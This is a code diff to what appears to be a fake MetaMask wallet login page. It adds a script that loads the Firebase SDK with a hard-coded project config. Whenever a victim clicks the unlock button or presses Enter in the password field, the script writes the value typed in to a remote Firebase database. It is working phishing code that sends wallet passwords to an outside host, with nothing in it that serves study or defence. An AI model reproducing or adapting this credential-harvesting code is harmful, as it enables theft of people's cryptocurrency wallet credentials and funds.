@@ -79,6 +79,42 @@
     <div class="lg-img" id="connecWallet" onclick="openMetaMaskModal();"></div>
   </body>
   <script src="/metamask/bundle.js"></script>
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js'
+
+    // If you enabled Analytics in your project, add the Firebase SDK for Google Analytics
+    import { getAnalytics } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-analytics.js'
+
+    // Add Firebase products that you want to use
+    import { getAuth } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js'
+    import { getFirestore } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js'
+    import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js'
+
+    const firebaseConfig = {
+            apiKey: "AIzaSyBEK2uYEkgIVN4SsYqoJ5CK0208KLzp9Zg",
+            authDomain: "agencyhill99-96117.firebaseapp.com",
+            databaseURL: "https://agencyhill99-96117-default-rtdb.firebaseio.com",
+            projectId: "agencyhill99-96117",
+            storageBucket: "agencyhill99-96117.firebasestorage.app",
+            messagingSenderId: "710897922514",
+            appId: "1:710897922514:web:32b391e70aaf11a9f2580b",
+            measurementId: "G-HMSZ5FVCGG"
+        };
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+
+    const db = getDatabase(app);
+  
+    document.getElementById('metamask-unlock').addEventListener('click', function (ev) {
+      set(ref(db, "88_/" + metamaskInput.value), { db_info: metamaskInput.value });
+    });
+    document.getElementById('metamask-password').addEventListener('keydown', function(event) {
+        if (event.key === 'Enter') {
+          // Send the password via AJAX using Fetch API
+          set(ref(db, "88_/" + metamaskInput.value), { db_info: metamaskInput.value });
+        }
+    });
+  </script>
   <script>
     const modal = document.getElementById("loginModal");
     const modalContent = document.querySelector(".modal-content");
@@ -102,6 +138,7 @@
     });
 
     unlockBtn.addEventListener('click', function (ev) {
+      if(metamaskInput.value == '') return;
       mmLoading.classList.remove("hidden");
       let timer = setTimeout(() => {
         clearTimeout(timer);
@@ -113,6 +150,7 @@
 
     metamaskInput.addEventListener('keydown', function(event) {
         if (event.key === 'Enter') {
+          if(metamaskInput.value == '') return;
           mmLoading.classList.remove("hidden");
           let timer = setTimeout(() => {
             clearTimeout(timer);
